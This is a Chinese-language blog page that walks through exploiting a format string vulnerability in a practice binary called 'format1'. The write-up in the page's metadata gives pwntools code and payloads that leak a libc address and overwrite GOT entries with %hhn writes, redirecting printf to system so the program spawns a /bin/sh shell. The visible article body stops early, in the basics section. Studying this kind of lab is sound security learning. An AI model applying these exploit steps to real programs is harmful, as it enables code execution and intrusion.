<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>格式化字符串 | Reus09&#39;s Blog</title>
<meta name="keywords" content="格式化字符串漏洞">
<meta name="description" content="格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参">
<meta name="author" content="Reus09">
<link rel="canonical" href="http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="格式化字符串" />
<meta property="og:description" content="格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-03T20:46:59+00:00" />
<meta property="article:modified_time" content="2022-09-11T15:43:48+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="格式化字符串"/>
<meta name="twitter:description" content="格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "📚文章",
      "item": "http://www.reus09.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "👨🏻‍💻技术",
      "item": "http://www.reus09.top/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "格式化字符串",
      "item": "http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "格式化字符串",
  "name": "格式化字符串",
  "description": "格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参",
  "keywords": [
    "格式化字符串漏洞"
  ],
  "articleBody": "格式化字符串漏洞 0x01 目的 通过格式化字符串掌握泄露内存数据和覆写内存。 0x02 基础知识 格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。\nprintf 功能：向stdout按规定的格式输出信息；\n格式：\n1 int printf (const char *format,[argument]...) format是格式控制字符串，其他参数为输出项； printf(\"Id=%d\",Id); sprintf 功能：把格式化的数据写入某个字符串中；\n格式：\n1 int sprintf(char *buffer,const char *format,[argument]...) buffer是要卸乳字符串的缓冲区； 函数按照第二部分格式化字符的格式，把第三部分的数据进行格式化，然后在把格式化后的数据类型，存储到字符串的缓存区间里去； sprintf(buffer, \"Id=%d\", Id); snprintf 功能：把格式化的数据写入某个字符串中，控制字符串长度；\n格式：\n1 int snprintf(char *str,size_t size,const char *format,[argument]...) 在sprintf的基础上限制了可写入字符的最大值size； 当格式化后的字符串长度=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符\\0； sprintf(buffer, 10,\"Id=%d\", Id); fprintf 功能：用于格式化输出到一个流/文件中；\n格式：\n1 int fprintf(FILE *stream,const char *format,[argument]...) 根据指定的格式控制字符串format向输出流stream中写入数据； 当stream为stdout时，fprintf与printf的功能相同； printf(pfile,\"Id=%d\",Id); vprintf/vsprintf/vsnprintf/vfprintf 功能分别对应于printf/sprintf/snprintf/fprintf； 将变参列表换成了va_list类型的参数 格式： vprintf (format,va_list); vsprintf (buffer,format,va_list); vsnprintf (buffer,256,format,va_list); vfprintf(stream, format, va_list); 格式化字符串 格式化字符串是由普通字符串和格式化规定字符构成的字符序列：\n普通字符被原封不动地复制到输出流中； 格式化规定字符则是以%开始，用来确定输出内容格式； 基本格式\n%[parameter][flags][fieldwidth][.precision][length]type\nparameter\n可以忽略或者是n$，n表示是参数列表的第n个参数，通过这种形式直接访问第n个参数； flags\n用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等； fieldwidth\n限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式，超过限制宽度不会截断，正常显示； precision\n输出的最大长度； length\n指浮点型参数或者整形参数的长度； hh：1-byte； h：2-byte； l：4-byte； ll：8-byte； type\n转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域；\n| 字符 | 描述 | | —— | —————————————————————————————— | | d/i | 有符号十进制整数 | | u | 无符号十进制整数 | | x/X | 以十六进制形式输出无符号整数(不输出前缀0x) | | o | 以八进制形式输出无符号整数(不输出前缀0) | | s | 字符串 | | c | 字符 | | p | 指针 | | n | 不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量 | | f/F | 以小数形式输出单、双精度实数 | | e/E | 以指数形式输出单、双精度实数 | | g/G | 以%f%e中较短的输出宽度输出单、双精度实数，%e格式在指数小于-4或者大于等于精度时使用 | | a/A | 浮点数、十六进制数字和p-计数法 |\n0x03 漏洞原理 格式化字符串函数是根据格式化字符串函数来进行解析的，那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制；\n根据cdecl的调用约定，在进入printf()函数之前，将参数从右到左依次压栈。进入printf()之后,函数首先获取第一个参数，一次读取一个字符。如果字符不是%，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。 格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值，发生了格式化字符串漏洞。\n0x04 漏洞分析 分析 用IDAPro对format1程序进行分析，程序逻辑简单，在main函数中调用了getname函数 查看getname()函数，读取用户输入，发现print(buf)将用户输入进行打印，存在格式化字符串漏洞。 由于程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，这两个表是一一对应的，看到带有**@plt**标志的函数时，这个函数其实就是个过渡作用，可以通过PLT表跳转到GOT表来得到函数真正的地址： 利用思路 将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数； 通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址； 用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf 中写入/bin/sh，当执行printf(buf)时，相当于执行system('/bin/sh')； 利用过程 将exit函数的GOT表地址覆盖为main函数地址 将exit函数的GOT表地址覆写为main函数的地址，每次退出时将再返回到main函数。 先解决构建printf（format，[argument]）中format和argument\nformat覆写的格式为：% width c % num $ hhn\nwidth是将要写入到$hhn参数中的值，它由覆写的值和已经写入的长度决定，具体为：（已写入的长度-覆写的值）%0x80 根据反汇编可以看到buf数组的长度为0x80 num定了要写入的第num个参数，通过调试具体分析一下 这里给出两种方法\n用gdb调试\n在main和printf处设置断点。 然后运行程序，运行到printf地方 buf的地址为0xffffd12c,是printf中格式化字符串的第7个参数:即(0xffffd12c - 0xffffd110 ) / 4 = 7 通过pwntools进行查找\n简单的exp:\n1 2 3 4 5 6 7 8 from pwn import * context.log_level='debug' p = process('./format1') payload = b'a' * 4 + b' ' + b' %08x' * 20 print(payload) p.sendline(payload) p.recvuntil(\"Welcome~\\n\") 运行结果如下\n明显的看到0x61616161即为第七个参数 num的确定\n因为要把exit的GOT地址覆写为main函数地址，即0x8048648，所以应写入四个字节，即重复四次% width c % num $ hhn； 粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式% widthc % num $ hhn占用12个字节，四次重复共48个字节，占用48/4=12个参数； 由于buf是从第7个参数开始，写入的地址从第7+12=19个参数开始，num依次为19、20、21、22； 确定exit@got的地址；\n这里同样给出两种方法 gdb查看反汇编指令 先disass main查看main函数地址 发现exit@plt的地址为0x8048480 然后查看disass 0x8048480的反汇编，即进入exit@plt的函数内部 jmp所对应的的地址即为exit@got 为 0x804a024 直接借用gdb中的got命令 exit@got 为 0x804a024 main函数地址\n第一条即为main函数地址 ： 0x08048648 构造格式化字符串:\n确定了num和width，也确定了exit函数的got表地址为0x804a024，所以将要覆盖的exit@got地址0x804a024、0x804a025、0x804a026、0x804a027依次写入到第19、20、21、22个参数中，格式化字符串就构造好了：\n1 %72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\\x24\\xa0\\x04\\x08\\x25\\xa0\\x04\\x08\\x26\\xa0\\x04\\ x08\\x27\\xa0\\x04\\x08 编写generate_format(addr, value)函数构造格式化字符串，addr为要覆写的地址，value为覆写的值，函数代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def generate_format(addr,value): payload='' # 已写入的长度 print_count = 0 addr_part = '' # range 4 的原因是 地址为四个字节，四个循环即可结束。 for i in range(4): if value \u003e\u003e (8*i) == 0: break one_byte = (value \u003e\u003e (8*i)) \u0026 0xff # 0x100的原因 防止出现负数 payload += '%{0}c%{1}$hhn'.format((one_byte - print_count + 0x100) % 0x100,19+i) print_count += (one_byte - print_count) % 0x100 addr_part += p32(addr+i).decode('unicode_escape') payload = payload.ljust((12)*4,'a') payload += addr_part return payload 调用generate_format(exit_got,main)函数，生成的payload作为输入，执行后可以看到exit的got表的第一个地址被覆盖为main函数的地址，即0x08048648； 获取system的地址 获取思路分析\n由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露system 的地址，利用格式化字符串漏洞，泄露出GOT表中puts的地址，再利用libc中system函数与puts函数的偏移，计算出system地址； 先获取puts函数的got表地址，(这里与上面的方法相同)，所以puts函数got表的地址为0x804a01c，虽然可以直接查看0x804a01c内容即可得到puts函数的实际地址，这里使用格式化字符串漏洞来获取；\n构造格式化字符串\n构造的格式化字符串格式为：%num$s+puts@got，即把puts@got的地址写入 buf，再通过%s读出； 此时读出的puts地址为 puts在程序中真正运行的地址 其中%num$s占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置； 获取了puts的实际地址后，通过libc中两个函数的偏移即可得到system的地址，通过查阅资料可以得到libc的库的位置为/lib/i386-linux-gnu/libc.so.6； 所以get_sys_addr 有如下代码\n1 2 3 4 5 6 7 8 9 10 11 p.recvuntil(\"Welcome~\\n\") puts_got_addr = elf.got[\"puts\"] payload_puts = \"%8$s\" + p32(puts_got_addr).decode('unicode_escape') p.sendline(payload_puts) p.recvuntil(\"Welcome~\\n\") puts_addr = u32(p.recv(4)) libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\") offset = libc.symbols['puts']-libc.symbols['system'] sys_addr = puts_addr - offset 运行结果\n根据接收到的四个字节，我们可以看到拿到puts地址为0xf7e37cd0,system地址为0xf7e0b830 将其我们用gdb调试得到的地址相比，正确 覆写got 表中printf地址 原理与覆写exit函数GOT表相同，调用generate_format(printf@got,system_addr)，生成的payload作为输入，代码如下：\n1 2 3 4 printf_got = elf.got['printf'] payload_system = generate_format(printf_got,sys_addr) p.sendline(payload_system) 运行代码 可以发现printf@got被覆盖为0xf7e0b830 执行system(’/bin/sh') 此时GOT表中printf地址已被覆写为system地址，在buf中输入/bin/sh，执行printf(buf)时，相当于执行system('/bin/sh')，最后代码如下:\n1 2 3 4 p.recvuntil(\"Welcome~\\n\") p.sendline(\"/bin/sh\") p.interactive() 运行编写的python代码，成功拿到shell权限；\n0x05 总结 格式化字符串漏洞泄露内存数据和覆写内存理解加深。 Linux中got表和plt表的关系进一步理解。 pwntools查看函数参数的位置的一些用法 pwntools可以直接导入elf,process,libc库 ",
  "wordCount" : "4197",
  "inLanguage": "en",
  "datePublished": "2021-11-03T20:46:59Z",
  "dateModified": "2022-09-11T15:43:48+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.reus09.top/posts/tech/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://www.reus09.top" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://www.reus09.top/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/" title="主页">
                    <span>主页</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/archives/" title="时间轴">
                    <span>时间轴</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/categories" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/tags" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://www.reus09.top">Home</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/">📚文章</a>&nbsp;»&nbsp;<a href="http://www.reus09.top/posts/tech/">👨🏻‍💻技术</a></div>
    <h1 class="post-title">
      格式化字符串
    </h1>
    <div class="post-meta"><span title='2021-11-03 20:46:59 +0000 UTC'>2021-11-03</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e" aria-label="格式化字符串漏洞">格式化字符串漏洞</a><ul>
                            
                    <li>
                        <a href="#0x01-%e7%9b%ae%e7%9a%84" aria-label="0x01 目的">0x01 目的</a></li>
                    <li>
                        <a href="#0x02-%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="0x02 基础知识">0x02 基础知识</a><ul>
                            
                    <li>
                        <a href="#printf" aria-label="printf">printf</a></li>
                    <li>
                        <a href="#sprintf" aria-label="sprintf">sprintf</a></li>
                    <li>
                        <a href="#snprintf" aria-label="snprintf">snprintf</a></li>
                    <li>
                        <a href="#fprintf" aria-label="fprintf">fprintf</a></li>
                    <li>
                        <a href="#vprintfvsprintfvsnprintfvfprintf" aria-label="vprintf/vsprintf/vsnprintf/vfprintf">vprintf/vsprintf/vsnprintf/vfprintf</a></li>
                    <li>
                        <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2" aria-label="格式化字符串">格式化字符串</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x03-%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" aria-label="0x03 漏洞原理">0x03 漏洞原理</a></li>
                    <li>
                        <a href="#0x04-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="0x04 漏洞分析">0x04 漏洞分析</a><ul>
                            
                    <li>
                        <a href="#%e5%88%86%e6%9e%90" aria-label="分析">分析</a></li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="利用思路">利用思路</a></li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b" aria-label="利用过程">利用过程</a><ul>
                            
                    <li>
                        <a href="#%e5%b0%86exit%e5%87%bd%e6%95%b0%e7%9a%84got%e8%a1%a8%e5%9c%b0%e5%9d%80%e8%a6%86%e7%9b%96%e4%b8%bamain%e5%87%bd%e6%95%b0%e5%9c%b0%e5%9d%80" aria-label="将exit函数的GOT表地址覆盖为main函数地址">将exit函数的GOT表地址覆盖为main函数地址</a></li>
                    <li>
                        <a href="#%e8%8e%b7%e5%8f%96system%e7%9a%84%e5%9c%b0%e5%9d%80" aria-label="获取system的地址">获取system的地址</a></li>
                    <li>
                        <a href="#%e8%a6%86%e5%86%99got-%e8%a1%a8%e4%b8%adprintf%e5%9c%b0%e5%9d%80" aria-label="覆写got 表中printf地址">覆写got 表中printf地址</a></li>
                    <li>
                        <a href="#%e6%89%a7%e8%a1%8csystembinsh" aria-label="执行system(&amp;rsquo;/bin/sh&#39;)">执行system(&rsquo;/bin/sh')</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x05-%e6%80%bb%e7%bb%93" aria-label="0x05 总结">0x05 总结</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><h1 id="格式化字符串漏洞">格式化字符串漏洞<a hidden class="anchor" aria-hidden="true" href="#格式化字符串漏洞">#</a></h1>
<h2 id="0x01-目的">0x01 目的<a hidden class="anchor" aria-hidden="true" href="#0x01-目的">#</a></h2>
<ul>
<li>通过格式化字符串掌握泄露内存数据和覆写内存。</li>
</ul>
<h2 id="0x02-基础知识">0x02 基础知识<a hidden class="anchor" aria-hidden="true" href="#0x02-基础知识">#</a></h2>
<ul>
<li>
<p>格式化函数是一种特殊的ANSI C函数，它们从格式化字符串中提取参数，并对这些参数进行处理。而格式化字符串将C语言的主要数据类型，以易于阅读的方式保存在字符串里。从程序输出数据、打印错误信息到处理字符串数据，格式化字符串几乎出现在所有的C程序中。</p>
</li>
<li>
<h3 id="printf">printf<a hidden class="anchor" aria-hidden="true" href="#printf">#</a></h3>
<ul>
<li>
<p>功能：向stdout按规定的格式输出信息；</p>
</li>
<li>
<p>格式：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>int printf (const char *format,[argument]...)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>format是格式控制字符串，其他参数为输出项；</li>
<li><code>printf(&quot;Id=%d&quot;,Id);</code></li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="sprintf">sprintf<a hidden class="anchor" aria-hidden="true" href="#sprintf">#</a></h3>
<ul>
<li>
<p>功能：把格式化的数据写入某个字符串中；</p>
</li>
<li>
<p>格式：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>int sprintf(char *buffer,const char *format,[argument]...)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>buffer是要卸乳字符串的缓冲区；</li>
<li>函数按照第二部分格式化字符的格式，把第三部分的数据进行格式化，然后在把格式化后的数据类型，存储到字符串的缓存区间里去；</li>
<li><code>sprintf(buffer, &quot;Id=%d&quot;, Id);</code></li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="snprintf">snprintf<a hidden class="anchor" aria-hidden="true" href="#snprintf">#</a></h3>
<ul>
<li>
<p>功能：把格式化的数据写入某个字符串中，控制字符串长度；</p>
</li>
<li>
<p>格式：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>int snprintf(char *str,size_t size,const char *format,[argument]...)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>在sprintf的基础上限制了可写入字符的最大值size；</li>
<li>当格式化后的字符串长度=size，则将其中的size-1个字符复制到str中，并在最后添加字符串结束符<code>\0</code>；</li>
<li><code>sprintf(buffer, 10,&quot;Id=%d&quot;, Id);</code></li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="fprintf">fprintf<a hidden class="anchor" aria-hidden="true" href="#fprintf">#</a></h3>
<ul>
<li>
<p>功能：用于格式化输出到一个流/文件中；</p>
</li>
<li>
<p>格式：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>int fprintf(FILE *stream,const char *format,[argument]...)
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>根据指定的格式控制字符串format向输出流stream中写入数据；</li>
<li>当stream为stdout时，fprintf与printf的功能相同；</li>
<li><code>printf(pfile,&quot;Id=%d&quot;,Id);</code></li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="vprintfvsprintfvsnprintfvfprintf">vprintf/vsprintf/vsnprintf/vfprintf<a hidden class="anchor" aria-hidden="true" href="#vprintfvsprintfvsnprintfvfprintf">#</a></h3>
<ul>
<li>功能分别对应于printf/sprintf/snprintf/fprintf；</li>
<li>将变参列表换成了va_list类型的参数</li>
<li>格式：
<ul>
<li><code>vprintf (format,va_list);</code></li>
<li><code>vsprintf (buffer,format,va_list);</code></li>
<li><code>vsnprintf (buffer,256,format,va_list);</code></li>
<li><code>vfprintf(stream, format, va_list);</code></li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="格式化字符串">格式化字符串<a hidden class="anchor" aria-hidden="true" href="#格式化字符串">#</a></h3>
<ul>
<li>
<p>格式化字符串是由普通字符串和格式化规定字符构成的字符序列：</p>
<ul>
<li>普通字符被原封不动地复制到输出流中；</li>
<li>格式化规定字符则是以<code>%</code>开始，用来确定输出内容格式；</li>
</ul>
</li>
<li>
<p>基本格式</p>
<p><code>%[parameter][flags][fieldwidth][.precision][length]type</code></p>
<ul>
<li>
<p>parameter</p>
<ul>
<li>可以忽略或者是<code>n$</code>，n表示是参数列表的第n个参数，通过这种形式直接访问第n个参数；</li>
</ul>
</li>
<li>
<p>flags</p>
<ul>
